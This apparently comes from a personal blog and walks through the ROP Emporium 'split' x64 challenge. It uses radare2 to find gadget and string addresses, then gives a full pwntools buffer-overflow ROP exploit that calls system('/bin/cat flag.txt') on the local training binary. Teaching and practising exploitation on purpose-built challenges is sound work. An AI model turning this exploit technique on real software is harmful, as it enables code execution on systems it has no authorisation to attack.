---
layout: post
title:  "ROP Emporium split Writeup (x64)"
date:   2024-06-01 13:15:45 -0400
categories: rop-emporium split
tags: rop-emporium split x64 writeup buffer-overflow rop
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[second challenge](https://ropemporium.com/challenge/split.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/split.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `system` with the argument `/bin/cat flag.txt`.
This string is also present in the binary!

### x64 Calling Convention
We know from the first challenge we need to set the
instruction pointer to a function address in order to
call that function. But how do we pass arguments to
those functions?

In `x64` arguments are passed through specific registers.
The first three arguments correspond to the `rdi`, `rsi`,
and `rdx` registers respectively. 
[This x64 cheat sheet](https://ropemporium.com/challenge/split.html){:target="_blank"}{:rel="noopener noreferrer"}
can help if you want to learn more about `x64`.

## Exploit Crafting
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to get this value see the
[ret2win writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

### Function Address
> Is there an address where `system()` is called?
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. To list functions with their
addresses we can run `afl`
![ret2win-addr](/images/split/x64-addr.png)

Let's investigate `usefulFunction`. We can view
the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful-asm](/images/split/x64-useful-asm.png)

This function seems to `call` the `system()` function
with the argument `/bin/ls`. We want to change the
argument but let's take note of the `call` address
`0x0040074b`

### Setting Arguments
> Find a gadget which sets the `rdi` register
{: .prompt-tip }
According to the
[x64 calling convention](https://ropemporium.com/challenge/split.html){:target="_blank"}{:rel="noopener noreferrer"},
a function's first argument is passed through the
`rdi` register. In order to set this value we need
to find a `pop rdi` gadget which will take a value
off of the stack and place it into `rdi`

We can search for ROP gadgets in `radare2` with the `/R`
command

```
/R pop rdi
```
![rdi-addr](/images/split/x64-rdi-addr.png)

The address of our gadget is `0x004007c3`. Once we call
this gadget, we'll need to pass the address of the
string we want to execute onto the stack.

### String Address
> The string `/bin/cat flag.txt` exists in the binary
{: .prompt-tip }
Using `radare2` again we can search for case insensitive
strings with the `/i` command. So to find the address
of `/bin/cat flag.txt` we run

```
/i /bin/cat flag.txt
```
![cat-addr](/images/split/x64-cat-addr.png)

Awesome the address of the string is `0x00601060`

## Exploit
Now we have everything we need to build the exploit
```python
#!/bin/python3
from pwn import *

# useful addresses
str_addr = 0x00601060
sys_addr = 0x0040074b
pop_rdi_addr = 0x004007c3

# create payload
payload = b'A' * 40
# set arg1 (pop rdi)
payload += p64(pop_rdi_addr)
payload += p64(str_addr)
# call sys
payload += p64(sys_addr)

# send payload + receive flag
io = process('./split')
io.recv()
io.sendline(payload)
print(io.recvline())
success(io.recvline())
```
![flag](/images/split/x64-flag.png)

## Conclusion
This challenge takes things a step further than
just calling an arbitrary function by introducting the 
ability to set arbitrary arguments for that function.
